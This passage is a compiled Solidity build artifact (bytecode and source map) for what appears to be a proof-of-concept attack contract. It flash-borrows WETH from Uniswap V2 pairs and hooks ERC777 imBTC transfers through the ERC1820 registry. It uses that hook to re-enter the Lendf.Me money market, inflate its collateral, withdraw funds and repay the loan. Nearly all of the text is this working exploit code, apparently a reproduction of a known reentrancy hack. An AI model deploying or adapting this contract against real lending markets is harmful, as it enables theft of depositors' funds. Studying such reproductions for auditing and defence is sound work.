8135905061282e8161280a565b92915050565b5f819050919050565b61284681612834565b8114612850575f5ffd5b50565b5f813590506128618161283d565b92915050565b5f5ffd5b5f5ffd5b5f5ffd5b5f5f83601f84011261288857612887612867565b5b8235905067ffffffffffffffff8111156128a5576128a461286b565b5b6020830191508360018202830111156128c1576128c061286f565b5b9250929050565b5f5f5f5f5f5f5f5f60c0898b0312156128e4576128e36127d2565b5b5f6128f18b828c01612820565b98505060206129028b828c01612820565b97505060406129138b828c01612820565b96505060606129248b828c01612853565b955050608089013567ffffffffffffffff811115612945576129446127d6565b5b6129518b828c01612873565b945094505060a089013567ffffffffffffffff811115612974576129736127d6565b5b6129808b828c01612873565b92509250509295985092959890939650565b5f5f5f5f5f608086880312156129ab576129aa6127d2565b5b5f6129b888828901612820565b95505060206129c988828901612853565b94505060406129da88828901612853565b935050606086013567ffffffffffffffff8111156129fb576129fa6127d6565b5b612a0788828901612873565b92509250509295509295909350565b5f60208284031215612a2b57612a2a6127d2565b5b5f612a3884828501612853565b91505092915050565b612a4a816127f9565b82525050565b5f602082019050612a635f830184612a41565b92915050565b612a7281612834565b82525050565b5f602082019050612a8b5f830184612a69565b92915050565b7f4e487b71000000000000000000000000000000000000000000000000000000005f52602160045260245ffd5b5f82825260208201905092915050565b7f6261642d73656e646572000000000000000000000000000000000000000000005f82015250565b5f612b02600a83612abe565b9150612b0d82612ace565b602082019050919050565b5f6020820190508181035f830152612b2f81612af6565b9050919050565b5f612b40826127da565b9050919050565b612b5081612b36565b8114612b5a575f5ffd5b50565b5f81359050612b6b81612b47565b92915050565b5f5f60408385031215612b8757612b866127d2565b5b5f612b9485828601612b5d565b9250506020612ba585828601612853565b9150509250929050565b7f706169722d6f6e6c7900000000000000000000000000000000000000000000005f82015250565b5f612be3600983612abe565b9150612bee82612baf565b602082019050919050565b5f6020820190508181035f830152612c1081612bd7565b9050919050565b5f81519050612c258161280a565b92915050565b5f60208284031215612c4057612c3f6127d2565b5b5f612c4d84828501612c17565b91505092915050565b7f776574682d6d697373696e6700000000000000000000000000000000000000005f82015250565b5f612c8a600c83612abe565b9150612c9582612c56565b602082019050919050565b5f6020820190508181035f830152612cb781612c7e565b9050919050565b7f6c6f616e2d6d69736d61746368000000000000000000000000000000000000005f82015250565b5f612cf2600d83612abe565b9150612cfd82612cbe565b602082019050919050565b5f6020820190508181035f830152612d1f81612ce6565b9050919050565b5f81519050612d348161283d565b92915050565b5f60208284031215612d4f57612d4e6127d2565b5b5f612d5c84828501612d26565b91505092915050565b7f6d697373696e672d6c6f616e00000000000000000000000000000000000000005f82015250565b5f612d99600c83612abe565b9150612da482612d65565b602082019050919050565b5f6020820190508181035f830152612dc681612d8d565b9050919050565b7f4e487b71000000000000000000000000000000000000000000000000000000005f52601160045260245ffd5b5f612e0482612834565b9150612e0f83612834565b9250828201905080821115612e2757612e26612dcd565b5b92915050565b7f73656c662d6f6e6c7900000000000000000000000000000000000000000000005f82015250565b5f612e61600983612abe565b9150612e6c82612e2d565b602082019050919050565b5f6020820190508181035f830152612e8e81612e55565b9050919050565b5f604082019050612ea85f830185612a41565b612eb56020830184612a69565b9392505050565b5f81519050919050565b5f81905092915050565b8281835e5f83830152505050565b5f612ee882612ebc565b612ef28185612ec6565b9350612f02818560208601612ed0565b80840191505092915050565b5f612f198284612ede565b915081905092915050565b7f776574682d737570706c792d6661696c656400000000000000000000000000005f82015250565b5f612f58601283612abe565b9150612f6382612f24565b602082019050919050565b5f6020820190508181035f830152612f8581612f4c565b9050919050565b7f63616c6c6261636b2d6d61726b65742d656d70747900000000000000000000005f82015250565b5f612fc0601583612abe565b9150612fcb82612f8c565b602082019050919050565b5f6020820190508181035f830152612fed81612fb4565b9050919050565b7f4e487b71000000000000000000000000000000000000000000000000000000005f52601260045260245ffd5b5f61302b82612834565b915061303683612834565b92508261304657613045612ff4565b5b828204905092915050565b7f626f72726f772d706174682d6661696c656400000000000000000000000000005f82015250565b5f613085601283612abe565b915061309082613051565b602082019050919050565b5f6020820190508181035f8301526130b281613079565b9050919050565b5f6130c382612834565b91506130ce83612834565b92508282039050818111156130e6576130e5612dcd565b5b92915050565b5f6130f682612834565b915061310183612834565b925082820261310f81612834565b9150828204841483151761312657613125612dcd565b5b5092915050565b7f6e6f2d756e69737761702d7631000000000000000000000000000000000000005f82015250565b5f613161600d83612abe565b915061316c8261312d565b602082019050919050565b5f6020820190508181035f83015261318e81613155565b9050919050565b7f6e6f2d63616c6c6261636b2d70726f66697400000000000000000000000000005f82015250565b5f6131c9601283612abe565b91506131d482613195565b602082019050919050565b5f6020820190508181035f8301526131f6816131bd565b9050919050565b5f819050919050565b5f819050919050565b5f61322961322461321f846131fd565b613206565b612834565b9050919050565b6132398161320f565b82525050565b5f6060820190506132525f830186612a69565b61325f6020830185613230565b61326c6040830184612a69565b949350505050565b7f696e73756666696369656e742d7265616c697a65642d776574680000000000005f82015250565b5f6132a8601a83612abe565b91506132b382613274565b602082019050919050565b5f6020820190508181035f8301526132d58161329c565b9050919050565b5f8115159050919050565b6132f0816132dc565b81146132fa575f5ffd5b50565b5f8151905061330b816132e7565b92915050565b5f60208284031215613326576133256127d2565b5b5f613333848285016132fd565b91505092915050565b7f7472616e736665722d6661696c656400000000000000000000000000000000005f82015250565b5f613370600f83612abe565b915061337b8261333c565b602082019050919050565b5f6020820190508181035f83015261339d81613364565b9050919050565b5f819050919050565b6133b6816133a4565b82525050565b5f6060820190506133cf5f830186612a41565b6133dc60208301856133ad565b6133e96040830184612a41565b949350505050565b5f5f5f5f5f5f5f5f5f6101208a8c03121561340f5761340e6127d2565b5b5f61341c8c828d016132fd565b995050602061342d8c828d01612d26565b985050604061343e8c828d01612c17565b975050606061344f8c828d01612d26565b96505060806134608c828d01612d26565b95505060a06134718c828d01612d26565b94505060c06134828c828d01612d26565b93505060e06134938c828d01612d26565b9250506101006134a58c828d01612d26565b9150509295985092959850929598565b7f6e6f2d76322d70616972000000000000000000000000000000000000000000005f82015250565b5f6134e9600a83612abe565b91506134f4826134b5565b602082019050919050565b5f6020820190508181035f830152613516816134dd565b9050919050565b5f82825260208201905092915050565b5f601f19601f8301169050919050565b5f61354782612ebc565b613551818561351d565b9350613561818560208601612ed0565b61356a8161352d565b840191505092915050565b5f6080820190506135885f830187612a69565b6135956020830186612a69565b6135a26040830185612a41565b81810360608301526135b4818461353d565b905095945050505050565b7f617070726f76652d6661696c65640000000000000000000000000000000000005f82015250565b5f6135f3600e83612abe565b91506135fe826135bf565b602082019050919050565b5f6020820190508181035f830152613620816135e7565b9050919050565b7f4e487b71000000000000000000000000000000000000000000000000000000005f52603260045260245ffd5b5f6040820190506136675f830185612a41565b6136746020830184612a41565b9392505050565b5f6dffffffffffffffffffffffffffff82169050919050565b61369d8161367b565b81146136a7575f5ffd5b50565b5f815190506136b881613694565b92915050565b5f63ffffffff82169050919050565b6136d6816136be565b81146136e0575f5ffd5b50565b5f815190506136f1816136cd565b92915050565b5f5f5f6060848603121561370e5761370d6127d2565b5b5f61371b868287016136aa565b935050602061372c868287016136aa565b925050604061373d868287016136e3565b915050925092509256fea264697066735822122051b7059d0a1b1431e4150ac97cb8bfa9121f0506cdc2636b6f61000cd5d26f2564736f6c634300081e0033","sourceMap":"2363:14752:0:-:0;;;4000:47;;;;;;;;;;4024:16;:14;;;:16;;:::i;:::-;2363:14752;;16886:227;2614:42;16931:31;;;16971:4;3395:31;17006:4;16931:81;;;;;;;;;;;;;;;;;:::i;:::-;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;2614:42;17022:31;;;17062:4;3482:34;17100:4;17022:84;;;;;;;;;;;;;;;;;:::i;:::-;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;16886:227::o;7:126:1:-;44:7;84:42;77:5;73:54;62:65;;7:126;;;:::o;139:96::-;176:7;205:24;223:5;205:24;:::i;:::-;194:35;;139:96;;;:::o;241:118::-;328:24;346:5;328:24;:::i;:::-;323:3;316:37;241:118;;:::o;365:77::-;402:7;431:5;420:16;;365:77;;;:::o;448:118::-;535:24;553:5;535:24;:::i;:::-;530:3;523:37;448:118;;:::o;572:442::-;721:4;759:2;748:9;744:18;736:26;;772:71;840:1;829:9;825:17;816:6;772:71;:::i;:::-;853:72;921:2;910:9;906:18;897:6;853:72;:::i;:::-;935;1003:2;992:9;988:18;979:6;935:72;:::i;:::-;572:442;;;;;;:::o;2363:14752:0:-;;;;;;;","linkReferences":{}},"deployedBytecode":{"object":"0x608060405260043610610072575f3560e01c8063438865621161004d57806343886562146100e3578063493436241461010b5780635ff972cc1461013557806375ab97821461015f57610079565b806223de291461007d57806310d1e85c146100a55780633c2448ed146100cd57610079565b3661007957005b5f5ffd5b348015610088575f5ffd5b506100a3600480360381019061009e91906128c8565b610187565b005b3480156100b0575f5ffd5b506100cb60048036038101906100c69190612992565b610358565b005b3480156100d8575f5ffd5b506100e16107ca565b005b3480156100ee575f5ffd5b5061010960048036038101906101049190612a16565b6108ea565b005b348015610116575f5ffd5b5061011f61096c565b60405161012c9190612a50565b60405180910390f35b348015610140575f5ffd5b50610149610994565b6040516101569190612a78565b60405180910390f35b34801561016a575f5ffd5b50610185600480360381019061018091906128c8565b61099d565b005b5f60029054906101000a900473ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff163373ffffffffffffffffffffffffffffffffffffffff1614158061021457506001808111156101f1576101f0612a91565b5b5f5f9054906101000a900460ff16600181111561021157610210612a91565b5b14155b61034e57730eee3e3828a45f7601d5f54bf49bb01d1a9df5ea73ffffffffffffffffffffffffffffffffffffffff168773ffffffffffffffffffffffffffffffffffffffff1614158061029357503073ffffffffffffffffffffffffffffffffffffffff168673ffffffffffffffffffffffffffffffffffffffff1614155b61034e576001600254111561031d57600160025f82825403925050819055505f6102e05f60029054906101000a900473ffffffffffffffffffffffffffffffffffffffff166001546109a7565b905080610317575f6002819055505f5f5f6101000a81548160ff0219169083600181111561031157610310612a91565b5b02179055505b5061034d565b5f6002819055505f5f5f6101000a81548160ff0219169083600181111561034757610346612a91565b5b02179055505b5b5050505050505050565b3073ffffffffffffffffffffffffffffffffffffffff168573ffffffffffffffffffffffffffffffffffffffff16146103c6576040517f08c379a00000000000000000000000000000000000000000000000000000000081526004016103bd90612b18565b60405180910390fd5b5f5f83838101906103d79190612b71565b915091508173ffffffffffffffffffffffffffffffffffffffff163373ffffffffffffffffffffffffffffffffffffffff1614610449576040517f08c379a000000000000000000000000000000000000000000000000000000000815260040161044090612bf9565b60405180910390fd5b5f3373ffffffffffffffffffffffffffffffffffffffff16630dfe16816040518163ffffffff1660e01b8152600401602060405180830381865afa158015610493573d5f5f3e3d5ffd5b505050506040513d601f19601f820116820180604052508101906104b79190612c2b565b90505f3373ffffffffffffffffffffffffffffffffffffffff1663d21220a76040518163ffffffff1660e01b8152600401602060405180830381865afa158015610503573d5f5f3e3d5ffd5b505050506040513d601f19601f820116820180604052508101906105279190612c2b565b905073c02aaa39b223fe8d0a0e5c4f27ead9083c756cc273ffffffffffffffffffffffffffffffffffffffff168273ffffffffffffffffffffffffffffffffffffffff1614806105b6575073c02aaa39b223fe8d0a0e5c4f27ead9083c756cc273ffffffffffffffffffffffffffffffffffffffff168173ffffffffffffffffffffffffffffffffffffffff16145b6105f5576040517f08c379a00000000000000000000000000000000000000000000000000000000081526004016105ec90612ca0565b60405180910390fd5b5f73c02aaa39b223fe8d0a0e5c4f27ead9083c756cc273ffffffffffffffffffffffffffffffffffffffff168373ffffffffffffffffffffffffffffffffffffffff16146106435787610645565b885b9050838114610689576040517f08c379a000000000000000000000000000000000000000000000000000000000815260040161068090612d08565b60405180910390fd5b8373c02aaa39b223fe8d0a0e5c4f27ead9083c756cc273ffffffffffffffffffffffffffffffffffffffff166370a08231306040518263ffffffff1660e01b81526004016106d79190612a50565b602060405180830381865afa1580156106f2573d5f5f3e3d5ffd5b505050506040513d601f19601f820116820180604052508101906107169190612d3a565b1015610757576040517f08c379a000000000000000000000000000000000000000000000000000000000815260040161074e90612daf565b60405180910390fd5b5f61076185610ab1565b905061076c81610b6a565b61077581610e94565b5f61077f86610f0b565b905061079d670186cc6acd4b0000826107989190612dfa565b610f3a565b6107bc73c02aaa39b223fe8d0a0e5c4f27ead9083c756cc233836114da565b505050505050505050505050565b5f60019054906101000a900460ff166108e85760015f60016101000a81548160ff0219169083151502179055506107ff611641565b5f60035f6101000a81548173ffffffffffffffffffffffffffffffffffffffff021916908373ffffffffffffffffffffffffffffffffffffffff1602179055505f600481905550610863733212b29e33587a00fb1c83346f5dbfa69a45892361177f565b1580610889575061088773c02aaa39b223fe8d0a0e5c4f27ead9083c756cc261177f565b155b6108e85761089f68056bc75e2d63100000611821565b670186cc6acd4b000060045410156108e8576108c3680d8d726b7177a80000611821565b670186cc6acd4b000060045410156108e8576108e7681b1ae4d6e2ef500000611821565b5b565b3073ffffffffffffffffffffffffffffffffffffffff163373ffffffffffffffffffffffffffffffffffffffff1614610958576040517f08c379a000000000000000000000000000000000000000000000000000000000815260040161094f90612e77565b60405180910390fd5b61096181611910565b610969611b32565b50565b5f60035f9054906101000a900473ffffffffffffffffffffffffffffffffffffffff16905090565b5f600454905090565b5050505050505050565b5f5f5f730eee3e3828a45f7601d5f54bf49bb01d1a9df5ea73ffffffffffffffffffffffffffffffffffffffff16634b8a352960e01b86866040516024016109f0929190612e95565b604051602081830303815290604052907bffffffffffffffffffffffffffffffffffffffffffffffffffffffff19166020820180517bffffffffffffffffffffffffffffffffffffffffffffffffffffffff8381831617835250505050604051610a5a9190612f0e565b5f604051808303815f865af19150503d805f8114610a93576040519150601f19603f3d011682016040523d82523d5f602084013e610a98565b606091505b5091509150610aa78282611d77565b9250505092915050565b5f819050610b0873c02aaa39b223fe8d0a0e5c4f27ead9083c756cc2730eee3e3828a45f7601d5f54bf49bb01d1a9df5ea7fffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff611db2565b610b2673c02aaa39b223fe8d0a0e5c4f27ead9083c756cc282611f19565b610b65576040517f08c379a0000000000000000000000000000000000000000000000000000000008152600401610b5c90612f6e565b60405180910390fd5b919050565b5f733212b29e33587a00fb1c83346f5dbfa69a45892373ffffffffffffffffffffffffffffffffffffffff166370a08231730eee3e3828a45f7601d5f54bf49bb01d1a9df5ea6040518263ffffffff1660e01b8152600401610bcc9190612a50565b602060405180830381865afa158015610be7573d5f5f3e3d5ffd5b505050506040513d601f19601f82011682018060405250810190610c0b9190612d3a565b905060018111610c50576040517f08c379a0000000000000000000000000000000000000000000000000000000008152600401610c4790612fd6565b60405180910390fd5b733212b29e33587a00fb1c83346f5dbfa69a4589235f60026101000a81548173ffffffffffffffffffffffffffffffffffffffff021916908373ffffffffffffffffffffffffffffffffffffffff1602179055505f608082610cb29190613021565b90505f8103610cc057600190505b5f600190505f64e8d4a5100085610cd79190613021565b90508181118015610ce757508381105b15610cf0578091505b5b818310610e565782600181905550610d158385610d0e9190613021565b6018612023565b60028190555060015f5f6101000a81548160ff02191690836001811115610d3f57610d3e612a91565b5b02179055505f610d63733212b29e33587a00fb1c83346f5dbfa69a458923856109a7565b90505f5f5f6101000a81548160ff02191690836001811115610d8857610d87612a91565b5b0217905550808015610e24575083733212b29e33587a00fb1c83346f5dbfa69a45892373ffffffffffffffffffffffffffffffffffffffff166370a08231306040518263ffffffff1660e01b8152600401610de39190612a50565b602060405180830381865afa158015610dfe573d5f5f3e3d5ffd5b505050506040513d601f19601f82011682018060405250810190610e229190612d3a565b115b15610e33575050505050610e91565b60018403610e415750610e56565b600284610e4e9190613021565b935050610cf1565b6040517f08c379a0000000000000000000000000000000000000000000000000000000008152600401610e889061309b565b60405180910390fd5b50565b5f8190505f8290505b5f82118015610eab57505f81115b15610f065781811115610ebc578190505b610eda73c02aaa39b223fe8d0a0e5c4f27ead9083c756cc28261204b565b15610ef2578082610eeb91906130b9565b9150610e9d565b600281610eff9190613021565b9050610e9d565b505050565b5f60016103e56103e884610f1f91906130ec565b610f299190613021565b610f339190612dfa565b9050919050565b5f73c02aaa39b223fe8d0a0e5c4f27ead9083c756cc273ffffffffffffffffffffffffffffffffffffffff166370a08231306040518263ffffffff1660e01b8152600401610f889190612a50565b602060405180830381865afa158015610fa3573d5f5f3e3d5ffd5b505050506040513d601f19601f82011682018060405250810190610fc79190612d3a565b9050818110610fd657506114d7565b5f73c0a47dfe034b400b47bdad5fecda2621de6c4d9573ffffffffffffffffffffffffffffffffffffffff166306f2bf62733212b29e33587a00fb1c83346f5dbfa69a4589236040518263ffffffff1660e01b81526004016110389190612a50565b602060405180830381865afa158015611053573d5f5f3e3d5ffd5b505050506040513d601f19601f820116820180604052508101906110779190612c2b565b90505f73ffffffffffffffffffffffffffffffffffffffff168173ffffffffffffffffffffffffffffffffffffffff16036110e7576040517f08c379a00000000000000000000000000000000000000000000000000000000081526004016110de90613177565b60405180910390fd5b5f733212b29e33587a00fb1c83346f5dbfa69a45892373ffffffffffffffffffffffffffffffffffffffff166370a08231306040518263ffffffff1660e01b81526004016111359190612a50565b602060405180830381865afa158015611150573d5f5f3e3d5ffd5b505050506040513d601f19601f820116820180604052508101906111749190612d3a565b90505f81116111b8576040517f08c379a00000000000000000000000000000000000000000000000000000000081526004016111af906131df565b60405180910390fd5b6111f7733212b29e33587a00fb1c83346f5dbfa69a458923837fffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff611db2565b5f611000826112069190613021565b90505f810361121457600190505b5f5f90505b600c8110156114005773c02aaa39b223fe8d0a0e5c4f27ead9083c756cc273ffffffffffffffffffffffffffffffffffffffff166370a08231306040518263ffffffff1660e01b815260040161126f9190612a50565b602060405180830381865afa15801561128a573d5f5f3e3d5ffd5b505050506040513d601f19601f820116820180604052508101906112ae9190612d3a565b94508585101561140057733212b29e33587a00fb1c83346f5dbfa69a45892373ffffffffffffffffffffffffffffffffffffffff166370a08231306040518263ffffffff1660e01b81526004016113059190612a50565b602060405180830381865afa158015611320573d5f5f3e3d5ffd5b505050506040513d601f19601f820116820180604052508101906113449190612d3a565b92505f830315611400578282111561135a578291505b8373ffffffffffffffffffffffffffffffffffffffff166395e3c50b83600180426113859190612dfa565b6040518463ffffffff1660e01b81526004016113a39392919061323f565b6020604051808303815f875af11580156113bf573d5f5f3e3d5ffd5b505050506040513d601f19601f820116820180604052508101906113e39190612d3a565b506113ec612155565b600182901b91508080600101915050611219565b5073c02aaa39b223fe8d0a0e5c4f27ead9083c756cc273ffffffffffffffffffffffffffffffffffffffff166370a08231306040518263ffffffff1660e01b815260040161144e9190612a50565b602060405180830381865afa158015611469573d5f5f3e3d5ffd5b505050506040513d601f19601f8201168201806040525081019061148d9190612d3a565b9350848410156114d2576040517f08c379a00000000000000000000000000000000000000000000000000000000081526004016114c9906132be565b60405180910390fd5b505050505b50565b5f5f8473ffffffffffffffffffffffffffffffffffffffff168484604051602401611506929190612e95565b6040516020818303038152906040527fa9059cbb000000000000000000000000000000000000000000000000000000007bffffffffffffffffffffffffffffffffffffffffffffffffffffffff19166020820180517bffffffffffffffffffffffffffffffffffffffffffffffffffffffff83818316178352505050506040516115909190612f0e565b5f604051808303815f865af19150503d805f81146115c9576040519150601f19603f3d011682016040523d82523d5f602084013e6115ce565b606091505b50915091508180156115fb57505f815114806115fa5750808060200190518101906115f99190613311565b5b5b61163a576040517f08c379a000000000000000000000000000000000000000000000000000000000815260040161163190613386565b60405180910390fd5b5050505050565b731820a4b7618bde71dce8cdc73aab6c95905fad2473ffffffffffffffffffffffffffffffffffffffff166329965a1d307f29ddb589b1fb5fc7cf394961c1adf5f8c6454761adf795e67fe149f658abe895306040518463ffffffff1660e01b81526004016116b2939291906133bc565b5f604051808303815f87803b1580156116c9575f5ffd5b505af11580156116db573d5f5f3e3d5ffd5b50505050731820a4b7618bde71dce8cdc73aab6c95905fad2473ffffffffffffffffffffffffffffffffffffffff166329965a1d307fb281fc8c12954d22544db45de3159a39272895b169a852b314f9cc762e44c53b306040518463ffffffff1660e01b8152600401611750939291906133bc565b5f604051808303815f87803b158015611767575f5ffd5b505af1158015611779573d5f5f3e3d5ffd5b50505050565b5f5f730eee3e3828a45f7601d5f54bf49bb01d1a9df5ea73ffffffffffffffffffffffffffffffffffffffff16638e8f294b846040518263ffffffff1660e01b81526004016117ce9190612a50565b61012060405180830381865afa1580156117ea573d5f5f3e3d5ffd5b505050506040513d601f19601f8201168201806040525081019061180e91906133f1565b5050505050505050905080915050919050565b5f3073ffffffffffffffffffffffffffffffffffffffff16634388656260e01b836040516024016118529190612a78565b604051602081830303815290604052907bffffffffffffffffffffffffffffffffffffffffffffffffffffffff19166020820180517bffffffffffffffffffffffffffffffffffffffffffffffffffffffff83818316178352505050506040516118bc9190612f0e565b5f604051808303815f865af19150503d805f81146118f5576040519150601f19603f3d011682016040523d82523d5f602084013e6118fa565b606091505b505090508061190c5761190b611b32565b5b5050565b5f61191a826121d6565b90505f73ffffffffffffffffffffffffffffffffffffffff168173ffffffffffffffffffffffffffffffffffffffff160361198a576040517f08c379a0000000000000000000000000000000000000000000000000000000008152600401611981906134ff565b60405180910390fd5b5f8173ffffffffffffffffffffffffffffffffffffffff16630dfe16816040518163ffffffff1660e01b8152600401602060405180830381865afa1580156119d4573d5f5f3e3d5ffd5b505050506040513d601f19601f820116820180604052508101906119f89190612c2b565b90505f73c02aaa39b223fe8d0a0e5c4f27ead9083c756cc273ffffffffffffffffffffffffffffffffffffffff168273ffffffffffffffffffffffffffffffffffffffff1614611a48575f611a4a565b835b90505f73c02aaa39b223fe8d0a0e5c4f27ead9083c756cc273ffffffffffffffffffffffffffffffffffffffff168373ffffffffffffffffffffffffffffffffffffffff1614611a9a5784611a9c565b5f5b90508373ffffffffffffffffffffffffffffffffffffffff1663022c0d9f838330888a604051602001611ad0929190612e95565b6040516020818303038152906040526040518563ffffffff1660e01b8152600401611afe9493929190613575565b5f604051808303815f87803b158015611b15575f5ffd5b505af1158015611b27573d5f5f3e3d5ffd5b505050505050505050565b611b3a612155565b5f73c02aaa39b223fe8d0a0e5c4f27ead9083c756cc273ffffffffffffffffffffffffffffffffffffffff166370a08231306040518263ffffffff1660e01b8152600401611b889190612a50565b602060405180830381865afa158015611ba3573d5f5f3e3d5ffd5b505050506040513d601f19601f82011682018060405250810190611bc79190612d3a565b90505f811115611c325773c02aaa39b223fe8d0a0e5c4f27ead9083c756cc260035f6101000a81548173ffffffffffffffffffffffffffffffffffffffff021916908373ffffffffffffffffffffffffffffffffffffffff1602179055508060048190555050611d75565b5f733212b29e33587a00fb1c83346f5dbfa69a45892373ffffffffffffffffffffffffffffffffffffffff166370a08231306040518263ffffffff1660e01b8152600401611c809190612a50565b602060405180830381865afa158015611c9b573d5f5f3e3d5ffd5b505050506040513d601f19601f82011682018060405250810190611cbf9190612d3a565b90505f811115611d2b57733212b29e33587a00fb1c83346f5dbfa69a45892360035f6101000a81548173ffffffffffffffffffffffffffffffffffffffff021916908373ffffffffffffffffffffffffffffffffffffffff160217905550806004819055505050611d75565b5f60035f6101000a81548173ffffffffffffffffffffffffffffffffffffffff021916908373ffffffffffffffffffffffffffffffffffffffff1602179055505f60048190555050505b565b5f821580611d86575060208251105b15611d93575f9050611dac565b5f82806020019051810190611da89190612d3a565b1490505b92915050565b5f5f8473ffffffffffffffffffffffffffffffffffffffff168484604051602401611dde929190612e95565b6040516020818303038152906040527f095ea7b3000000000000000000000000000000000000000000000000000000007bffffffffffffffffffffffffffffffffffffffffffffffffffffffff19166020820180517bffffffffffffffffffffffffffffffffffffffffffffffffffffffff8381831617835250505050604051611e689190612f0e565b5f604051808303815f865af19150503d805f8114611ea1576040519150601f19603f3d011682016040523d82523d5f602084013e611ea6565b606091505b5091509150818015611ed357505f81511480611ed2575080806020019051810190611ed19190613311565b5b5b611f12576040517f08c379a0000000000000000000000000000000000000000000000000000000008152600401611f0990613609565b60405180910390fd5b5050505050565b5f5f5f730eee3e3828a45f7601d5f54bf49bb01d1a9df5ea73ffffffffffffffffffffffffffffffffffffffff1663f2b9fdb860e01b8686604051602401611f62929190612e95565b604051602081830303815290604052907bffffffffffffffffffffffffffffffffffffffffffffffffffffffff19166020820180517bffffffffffffffffffffffffffffffffffffffffffffffffffffffff8381831617835250505050604051611fcc9190612f0e565b5f604051808303815f865af19150503d805f8114612005576040519150601f19603f3d011682016040523d82523d5f602084013e61200a565b606091505b50915091506120198282611d77565b9250505092915050565b5f5f8303612033575f9050612045565b8183116120405782612042565b815b90505b92915050565b5f5f5f730eee3e3828a45f7601d5f54bf49bb01d1a9df5ea73ffffffffffffffffffffffffffffffffffffffff1663f3fef3a360e01b8686604051602401612094929190612e95565b604051602081830303815290604052907bffffffffffffffffffffffffffffffffffffffffffffffffffffffff19166020820180517bffffffffffffffffffffffffffffffffffffffffffffffffffffffff83818316178352505050506040516120fe9190612f0e565b5f604051808303815f865af19150503d805f8114612137576040519150601f19603f3d011682016040523d82523d5f602084013e61213c565b606091505b509150915061214b8282611d77565b9250505092915050565b5f4790505f8111156121d35773c02aaa39b223fe8d0a0e5c4f27ead9083c756cc273ffffffffffffffffffffffffffffffffffffffff1663d0e30db0826040518263ffffffff1660e01b81526004015f604051808303818588803b1580156121bb575f5ffd5b505af11580156121cd573d5f5f3e3d5ffd5b50505050505b50565b5f5f6040518060600160405280736b175474e89094c44da98b954eedeac495271d0f73ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff16815260200173a0b86991c6218b36c1d19d4a2e9eb0ce3606eb4873ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff16815260200173dac17f958d2ee523a2206206994597c13d831ec773ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff1681525090505f5f5f90505b6003811015612528575f735c69bee701ef814a2b6a3edd4b1652cb9cc5aa6f73ffffffffffffffffffffffffffffffffffffffff1663e6a4390573c02aaa39b223fe8d0a0e5c4f27ead9083c756cc286856003811061231d5761231c613627565b5b60200201516040518363ffffffff1660e01b815260040161233f929190613654565b602060405180830381865afa15801561235a573d5f5f3e3d5ffd5b505050506040513d601f19601f8201168201806040525081019061237e9190612c2b565b90505f73ffffffffffffffffffffffffffffffffffffffff168173ffffffffffffffffffffffffffffffffffffffff16036123b9575061251b565b5f5f8273ffffffffffffffffffffffffffffffffffffffff16630902f1ac6040518163ffffffff1660e01b8152600401606060405180830381865afa158015612404573d5f5f3e3d5ffd5b505050506040513d601f19601f8201168201806040525081019061242891906136f7565b50915091505f73c02aaa39b223fe8d0a0e5c4f27ead9083c756cc273ffffffffffffffffffffffffffffffffffffffff168473ffffffffffffffffffffffffffffffffffffffff16630dfe16816040518163ffffffff1660e01b8152600401602060405180830381865afa1580156124a2573d5f5f3e3d5ffd5b505050506040513d601f19601f820116820180604052508101906124c69190612c2b565b73ffffffffffffffffffffffffffffffffffffffff16146124e757816124e9565b825b6dffffffffffffffffffffffffffff16905088811015801561250a57508581115b15612516578095508397505b505050505b80806001019150506122bb565b505f73ffffffffffffffffffffffffffffffffffffffff168373ffffffffffffffffffffffffffffffffffffffff16146125635750506127cd565b5f5f90505b60038110156127c9575f735c69bee701ef814a2b6a3edd4b1652cb9cc5aa6f73ffffffffffffffffffffffffffffffffffffffff1663e6a4390573c02aaa39b223fe8d0a0e5c4f27ead9083c756cc28685600381106125ca576125c9613627565b5b60200201516040518363ffffffff1660e01b81526004016125ec929190613654565b602060405180830381865afa158015612607573d5f5f3e3d5ffd5b505050506040513d601f19601f8201168201806040525081019061262b9190612c2b565b90505f73ffffffffffffffffffffffffffffffffffffffff168173ffffffffffffffffffffffffffffffffffffffff160361266657506127bc565b5f5f8273ffffffffffffffffffffffffffffffffffffffff16630902f1ac6040518163ffffffff1660e01b8152600401606060405180830381865afa1580156126b1573d5f5f3e3d5ffd5b505050506040513d601f19601f820116820180604052508101906126d591906136f7565b50915091505f73c02aaa39b223fe8d0a0e5c4f27ead9083c756cc273ffffffffffffffffffffffffffffffffffffffff168473ffffffffffffffffffffffffffffffffffffffff16630dfe16816040518163ffffffff1660e01b8152600401602060405180830381865afa15801561274f573d5f5f3e3d5ffd5b505050506040513d601f19601f820116820180604052508101906127739190612c2b565b73ffffffffffffffffffffffffffffffffffffffff16146127945781612796565b825b6dffffffffffffffffffffffffffff169050858111156127b7578095508397505b505050505b8080600101915050612568565b5050505b919050565b5f5ffd5b5f5ffd5b5f73ffffffffffffffffffffffffffffffffffffffff82169050919050565b5f612803826127da565b9050919050565b612813816127f9565b811461281d575f5ffd5b50565b5f8135905061282e8161280a565b92915050565b5f819050919050565b61284681612834565b8114612850575f5ffd5b50565b5f813590506128618161283d565b92915050565b5f5ffd5b5f5ffd5b5f5ffd5b5f5f83601f84011261288857612887612867565b5b8235905067ffffffffffffffff8111156128a5576128a461286b565b5b6020830191508360018202830111156128c1576128c061286f565b5b9250929050565b5f5f5f5f5f5f5f5f60c0898b0312156128e4576128e36127d2565b5b5f6128f18b828c01612820565b98505060206129028b828c01612820565b97505060406129138b828c01612820565b96505060606129248b828c01612853565b955050608089013567ffffffffffffffff811115612945576129446127d6565b5b6129518b828c01612873565b945094505060a089013567ffffffffffffffff811115612974576129736127d6565b5b6129808b828c01612873565b92509250509295985092959890939650565b5f5f5f5f5f608086880312156129ab576129aa6127d2565b5b5f6129b888828901612820565b95505060206129c988828901612853565b94505060406129da88828901612853565b935050606086013567ffffffffffffffff8111156129fb576129fa6127d6565b5b612a0788828901612873565b92509250509295509295909350565b5f60208284031215612a2b57612a2a6127d2565b5b5f612a3884828501612853565b91505092915050565b612a4a816127f9565b82525050565b5f602082019050612a635f830184612a41565b92915050565b612a7281612834565b82525050565b5f602082019050612a8b5f830184612a69